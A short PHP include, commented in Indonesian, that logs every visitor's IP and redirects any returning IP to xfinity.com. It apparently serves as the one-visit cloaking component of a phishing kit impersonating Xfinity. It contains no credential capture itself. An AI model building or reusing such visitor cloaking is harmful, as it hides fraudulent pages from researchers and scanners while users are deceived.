
<?php
defined("ALLOW") or exit('No direct script access allowed');
$banList = array(
    '192.168.0.1',
    '10.0.0.2',
    '123.456.789.0'
);

// Path file yang berisi daftar IP
$file = 'ip_log.txt';

// Membaca file dan mengambil IP
$ipArray = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Memasukkan IP ke dalam array banList setelah menghapus spasi atau karakter newline
foreach ($ipArray as $ip) {
    $banList[] = trim($ip);
}

// Mendapatkan IP pengguna
$userIP = $_SERVER['REMOTE_ADDR'];

// Memeriksa apakah IP pengguna ada dalam daftar banList
if (in_array($userIP, $banList)) {
    // Lakukan tindakan jika IP pengguna diban, misalnya redirect ke halaman larangan akses
    header("Location: https://www.xfinity.com");
    exit();
} else {
    // Lakukan tindakan jika IP pengguna tidak diban
    // Misalnya, lanjutkan pemrosesan atau tampilkan konten
  
}
// Mendapatkan IP pengunjung
$ip = $_SERVER['REMOTE_ADDR'];

// Menentukan file log yang akan digunakan untuk menyimpan catatan IP
$logFile = 'ip_log.txt';

// Mencatat IP pengunjung ke dalam file log
$logMessage = $ip . PHP_EOL;
file_put_contents($logFile, $logMessage, FILE_APPEND);

// Menambahkan IP pengunjung ke dalam array banList
$banList[] = $ip;
?>
